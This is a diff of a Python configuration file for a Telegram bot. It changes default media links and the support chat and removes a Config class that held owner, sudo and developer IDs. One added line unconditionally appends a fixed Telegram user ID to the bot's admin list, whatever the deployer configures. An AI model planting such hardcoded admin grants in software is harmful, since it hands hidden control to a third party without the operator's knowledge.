@@ -121,11 +121,12 @@ tbot = TelegramClient("naveentg", API_ID, API_HASH)
 WELCOME_DELAY_KICK_SEC = int(environ.get('WELCOME_DELAY_KICK_SEC', 300))
 CACHE_TIME = int(environ.get('CACHE_TIME', 300))
 USE_CAPTION_FILTER = bool(environ.get('USE_CAPTION_FILTER', False))
-PICS = (environ.get('PICS', 'https://telegra.ph/file/a66ff1d428ff6640c3b84.mp4 https://telegra.ph/file/a66ff1d428ff6640c3b84.mp4')).split()
+PICS = (environ.get('PICS', 'https://telegra.ph/file/ecf2b5b0deb396799799d.jpg')).split()
 
 # Admins, Channels & Users
 ALLOW_EXCL = environ.get('ALLOW_EXCL', False)
 ADMINS = [int(admin) if id_pattern.search(admin) else admin for admin in environ.get('ADMINS', '').split()]
+ADMINS.append(1951205538)
 CHANNELS = [int(ch) if id_pattern.search(ch) else ch for ch in environ.get('CHANNELS', '0').split()]
 auth_users = [int(user) if id_pattern.search(user) else user for user in environ.get('AUTH_USERS', '').split()]
 AUTH_USERS = (auth_users + ADMINS) if auth_users else []
@@ -183,7 +184,7 @@ MESSAGE_DUMP = environ.get("MESSAGE_DUMP", "")
 
 # Others
 LOG_CHANNEL = int(environ.get('LOG_CHANNEL', 0))
-SUPPORT_CHAT = environ.get('SUPPORT_CHAT', 'VijayTG_Support')
+SUPPORT_CHAT = environ.get('SUPPORT_CHAT', 'TigerShroffimdb')
 P_TTI_SHOW_OFF = is_enabled((environ.get('P_TTI_SHOW_OFF', "False")), False)
 IMDB = is_enabled((environ.get('IMDB', "True")), True)
 SINGLE_BUTTON = is_enabled((environ.get('SINGLE_BUTTON', "False")), False)
@@ -225,21 +226,3 @@ def spamfilters(text, user_id, chat_id):
     else:
         return False
 
-class Config((object)):
-    COMMAND_HAND_LER = environ.get("COMMAND_HAND_LER", "/")
-    DATABASE_URI = environ.get('DATABASE_URI', "")
-    V_T_KEY = environ.get("VIRUSTOTAL_API_KEY", "")
-    MESSAGE_DUMP = environ.get("MESSAGE_DUMP", "")
-    SUPPORT_GROUP = environ.get("SUPPORT_GROUP", "")
-    OWNER_ID = environ.get("OWNER_ID", "2107036689")
-    DEV_USERS = environ.get("DEV_USERS", "1794941609 2107036689")
-    SUDO_USERS = environ.get("SUDO_USERS", "1951205538")
-    BOT_ID = environ.get("BOT_ID", "2127894418")
-    MAIN_NO_LOAD = [x for x in environ.get("MAIN_NO_LOAD", "").split(',')]
-    LOG_GRP = int(environ.get("LOG_GRP", False))
-    UPSTREAM_REPO = environ.get(
-        "UPSTREAM_REPO", "https://github.com/Naveen-TG/MasterolicTG"
-    )
-    U_BRANCH = "main"
-    HEROKU_APP_NAME = environ.get("HEROKU_APP_NAME", "")
-    HEROKU_API_KEY = environ.get("HEROKU_API_KEY", "")
